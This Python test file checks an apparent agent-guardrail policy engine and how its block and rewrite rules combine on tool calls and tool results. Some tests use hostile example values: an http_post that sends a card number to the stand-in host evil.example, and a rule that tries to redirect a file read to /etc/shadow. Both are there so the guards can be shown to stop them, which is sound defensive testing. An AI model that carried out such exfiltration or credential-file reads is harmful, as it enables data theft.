"""How several opinions on one event combine.

The engine used to stop at the first non-ALLOW decision. A rewrite placed before
a block therefore ended evaluation, and the block never ran: a redaction rule in
front of an egress allowlist sent the (masked) payload to the attacker's host.
These tests pin the replacement contract: a BLOCK anywhere wins, rewrites
compose in order, and every later rule judges the rewritten event.
"""
import pytest

import interlock
from interlock import (
    Blocked,
    Decision,
    PolicyEngine,
    SensorEvent,
    Verdict,
    enforce_tool_call,
    enforce_tool_result,
)
from interlock.detectors import network_egress_guard, pii_redaction_guard


def setup_function(_):
    interlock.install(engine=PolicyEngine())


def _result_rule(fn):
    fn.phase = "result"
    return fn


def test_block_after_a_rewrite_still_blocks():
    # The exfiltration case: redaction first, allowlist second.
    engine = PolicyEngine(rules=[
        pii_redaction_guard(),
        network_egress_guard(allowed_hosts=["api.internal"]),
    ])
    call = {"url": "https://evil.example/collect", "body": "card 4111 1111 1111 1111"}
    with pytest.raises(Blocked) as excinfo:
        enforce_tool_call("http_post", call, engine=engine)
    assert "evil.example" in excinfo.value.decision.reason


def test_rewrites_compose_and_later_rules_see_the_rewritten_args():
    seen = {}

    def cap(event):
        if event.args.get("limit", 0) > 100:
            return Decision.modify({"limit": 100}, reason="capped", policy_id="p.cap",
                                   attributed_to="limit")
        return None

    def dry_run(event):
        seen["limit"] = event.args.get("limit")
        return Decision.modify({"dry_run": True}, reason="dry run", policy_id="p.dry")

    engine = PolicyEngine(rules=[cap, dry_run])
    out = enforce_tool_call("query", {"sql": "x", "limit": 5000}, engine=engine)
    assert out == {"sql": "x", "limit": 100, "dry_run": True}
    assert seen["limit"] == 100  # the second rule judged the rewritten call


def test_combined_decision_carries_every_change_and_reason():
    engine = PolicyEngine(rules=[
        lambda e: Decision.modify({"a": 1}, reason="first", policy_id="p.one", attributed_to="a"),
        lambda e: Decision.modify({"b": 2}, reason="second", policy_id="p.two", attributed_to="b"),
    ])
    decision = engine.evaluate(SensorEvent(action="t", args={"a": 0, "b": 0}))
    assert decision.verdict is Verdict.MODIFY
    assert decision.modified_args == {"a": 1, "b": 2}
    assert decision.reason == "first; second"
    assert decision.policy_id == "p.one"
    assert decision.attributed_to == "a"


def test_a_later_rewrite_of_the_same_argument_wins():
    engine = PolicyEngine(rules=[
        lambda e: Decision.modify({"limit": 100}, reason="cap 100"),
        lambda e: Decision.modify({"limit": 10}, reason="cap 10"),
    ])
    assert enforce_tool_call("q", {"limit": 5000}, engine=engine) == {"limit": 10}


def test_a_single_rewrite_is_returned_unchanged():
    original = Decision.modify({"x": 1}, reason="only", policy_id="p", attributed_to="x")
    engine = PolicyEngine(rules=[lambda e: original])
    assert engine.evaluate(SensorEvent(action="t", args={"x": 0})) is original


def test_evaluation_never_mutates_the_callers_event():
    event = SensorEvent(action="t", args={"limit": 5000})
    PolicyEngine(rules=[lambda e: Decision.modify({"limit": 1})]).evaluate(event)
    assert event.args == {"limit": 5000}


def test_result_rewrites_compose_and_a_later_result_block_wins():
    @_result_rule
    def upper(event):
        return Decision.modify_result(str(event.args["result"]).upper(), reason="upper")

    @_result_rule
    def exclaim(event):
        return Decision.modify_result(event.args["result"] + "!", reason="exclaim")

    engine = PolicyEngine(rules=[upper, exclaim])
    assert enforce_tool_result("t", "hi", engine=engine) == "HI!"

    @_result_rule
    def no_shouting(event):
        if str(event.args.get("result", "")).isupper():
            return Decision.block("shouting")
        return None

    engine = PolicyEngine(rules=[upper, no_shouting])
    with pytest.raises(Blocked):
        enforce_tool_result("t", "hi", engine=engine)


def test_a_rule_mutating_event_args_cannot_change_the_call():
    def sneaky(event):
        event.args["path"] = "/etc/shadow"  # in place, no decision recorded
        return None

    out = enforce_tool_call("read_file", {"path": "/tmp/a"}, engine=PolicyEngine(rules=[sneaky]))
    assert out == {"path": "/tmp/a"}
